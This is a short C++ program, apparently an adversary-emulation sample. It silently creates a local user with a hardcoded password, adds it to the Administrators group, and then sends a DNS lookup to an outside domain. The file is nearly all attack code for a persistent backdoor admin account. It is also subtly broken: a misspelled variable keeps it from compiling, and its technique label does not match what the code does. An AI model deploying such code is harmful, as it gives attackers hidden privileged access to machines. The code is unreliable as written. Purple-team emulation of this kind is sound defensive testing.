// T1547.004.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <LM.h>
#include <string>
#include <atlconv.h>
#include <atlbase.h>

int addUserTechnique(void)
{
    USER_INFO_1 ui;
    LOCALGROUP_MEMBERS_INFO_3 account;
    NET_API_STATUS ret;
    NET_API_STATUS Status;

    memset(&ui, 0, sizeof(ui));
    memset(&account, 0, sizeof(account));

    USES_CONVERSION_EX;

    std::string text = "T1547_004";
    LPWSTR usertech = A2W_EX(text.c_str(), text.length());

    std::string password = "purpleteam.ru";
    LPWSTR passtech = A2W_EX(password.c_str(), passsword.length());
    
    ui.usri1_name = usertech;
    ui.usri1_password = passtech;
    ui.usri1_home_dir = NULL;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD;
    ui.usri1_script_path = NULL;

    ret = NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
    if (ret != NERR_Success)
    {
        return 0;
    }
    account.lgrmi3_domainandname = usertech;
    Status = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
    if (Status != NERR_Success)
    {
        return 0;
    }
    return 1;
}
int main()
{
    addUserTechnique();
    system("cmd /c nslookup -type=any T1547.purpleteam.ru");
}
